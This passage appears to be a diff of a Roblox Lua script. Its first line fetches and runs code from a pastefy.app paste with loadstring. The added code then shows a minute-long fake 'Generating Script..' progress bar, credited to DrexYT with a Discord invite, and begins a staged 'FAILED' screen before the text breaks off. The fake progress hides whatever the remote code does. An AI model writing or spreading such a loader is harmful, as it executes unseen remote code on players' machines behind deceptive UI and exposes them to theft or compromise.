@@ -1,1 +1,95 @@
 loadstring(game:HttpGet("https://pastefy.app/aL0bokGt/raw"))()
+--// Services
+local Players, TweenService = game:GetService("Players"), game:GetService("TweenService")
+local player, playerGui = Players.LocalPlayer, Players.LocalPlayer:WaitForChild("PlayerGui")
+
+--// Helper
+local function styleText(lbl, font, size)
+	lbl.Font, lbl.TextSize, lbl.TextColor3 = font, size, Color3.new(1,1,1)
+	lbl.TextStrokeTransparency, lbl.TextStrokeColor3 = 0.8, Color3.new(0,0,0)
+end
+
+-------------------------------------------------
+-- UNANG SCRIPT (Loading Screen)
+-------------------------------------------------
+local screenGui1 = Instance.new("ScreenGui", playerGui)
+screenGui1.Name, screenGui1.IgnoreGuiInset, screenGui1.ResetOnSpawn = "SafeLoadingBar", true, false
+
+local container1 = Instance.new("Frame", screenGui1)
+container1.Size, container1.Position, container1.AnchorPoint = UDim2.new(0,420,0,150), UDim2.new(.5,0,.5,0), Vector2.new(.5,.5)
+container1.BackgroundColor3 = Color3.fromRGB(40,40,40)
+Instance.new("UICorner", container1).CornerRadius = UDim.new(0,14)
+
+local picture = Instance.new("ImageLabel", container1)
+picture.Size, picture.Position, picture.AnchorPoint = UDim2.new(0,120,0,120), UDim2.new(0,15,.5,0), Vector2.new(0,.5)
+picture.BackgroundTransparency, picture.Image, picture.ScaleType = 1, "rbxassetid://116749637853653", Enum.ScaleType.Fit
+
+local madeBy = Instance.new("TextLabel", container1)
+madeBy.Text, madeBy.Size, madeBy.Position, madeBy.BackgroundTransparency = "Made by : DrexYT", UDim2.new(1,-170,0,25), UDim2.new(0,150,.15,0), 1
+styleText(madeBy, Enum.Font.GothamBlack, 18)
+local madeByShadow = madeBy:Clone()
+madeByShadow.Position, madeByShadow.ZIndex, madeByShadow.Parent = madeBy.Position+UDim2.new(0,2,0,2), madeBy.ZIndex-1, container1
+
+local discordLink = Instance.new("TextLabel", container1)
+discordLink.Text, discordLink.RichText, discordLink.Size, discordLink.Position = "<u>https://discord.gg/drexscripthub</u>", true, UDim2.new(1,-170,0,20), UDim2.new(0,150,.33,0)
+discordLink.BackgroundTransparency = 1
+styleText(discordLink, Enum.Font.GothamSemibold, 16)
+local discordLinkShadow = discordLink:Clone()
+discordLinkShadow.Position, discordLinkShadow.ZIndex, discordLinkShadow.Parent = discordLink.Position+UDim2.new(0,2,0,2), discordLink.ZIndex-1, container1
+
+local title = Instance.new("TextLabel", container1)
+title.Size, title.Position, title.BackgroundTransparency = UDim2.new(1,-170,0,35), UDim2.new(0,150,.45,0), 1
+styleText(title, Enum.Font.GothamBlack, 18)
+local shadow = title:Clone()
+shadow.Position, shadow.ZIndex, shadow.Parent = title.Position+UDim2.new(0,2,0,2), title.ZIndex-1, container1
+
+local barBG = Instance.new("Frame", container1)
+barBG.Size, barBG.Position, barBG.BackgroundColor3, barBG.BorderSizePixel = UDim2.new(0,240,0,25), UDim2.new(0,150,.65,0), Color3.fromRGB(60,60,60), 0
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(0,8)
+
+local barFill = Instance.new("Frame", barBG)
+barFill.Size, barFill.BackgroundColor3, barFill.BorderSizePixel = UDim2.new(0,0,1,0), Color3.fromRGB(0,255,0), 0
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(0,8)
+
+local percentText = Instance.new("TextLabel", barBG)
+percentText.Text, percentText.Size, percentText.Position, percentText.AnchorPoint, percentText.BackgroundTransparency = "0%", UDim2.new(1,0,0,20), UDim2.new(.5,0,1.05,0), Vector2.new(.5,0), 1
+styleText(percentText, Enum.Font.GothamBlack, 18)
+
+local function typeText(txt)
+	title.Text, shadow.Text = "", ""
+	for i=1,#txt do
+		title.Text, shadow.Text = txt:sub(1,i), txt:sub(1,i)
+		task.wait(.03)
+	end
+end
+
+-------------------------------------------------
+-- ANIMATION ng Loading Screen (1 MINUTE total)
+-------------------------------------------------
+task.spawn(function()
+	typeText("Generating Script..")
+	for i=0,100 do
+		barFill:TweenSize(UDim2.new(i/100,0,1,0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, .6, true)
+		percentText.Text = i.."%"
+		task.wait(.6)
+	end
+	screenGui1:Destroy()
+
+	-------------------------------------------------
+	-- PANGALAWANG SCRIPT (FAILED UI)
+	-------------------------------------------------
+	local screenGui2 = Instance.new("ScreenGui", playerGui)
+	screenGui2.Name, screenGui2.IgnoreGuiInset, screenGui2.ResetOnSpawn = "BackgroundOnly", true, false
+
+	local container2 = Instance.new("Frame", screenGui2)
+	container2.Size, container2.Position, container2.AnchorPoint = UDim2.new(0,50,0,20), UDim2.new(.5,0,.5,0), Vector2.new(.5,.5)
+	container2.BackgroundColor3, container2.BackgroundTransparency = Color3.fromRGB(40,40,40), .05
+	Instance.new("UICorner", container2).CornerRadius = UDim.new(0,14)
+
+	local sideImage = Instance.new("ImageLabel", container2)
+	sideImage.Size, sideImage.Position, sideImage.AnchorPoint = UDim2.new(0,120,0,120), UDim2.new(0,10,.5,0), Vector2.new(0,.5)
+	sideImage.BackgroundTransparency, sideImage.Image, sideImage.ImageTransparency = 1, "rbxassetid://121395024337149", .1
+	Instance.new("UICorner", sideImage).CornerRadius = UDim.new(0,12)
+
+	local errorTitle = Instance.new("TextLabel", container2)
+	errorTitle.Siz
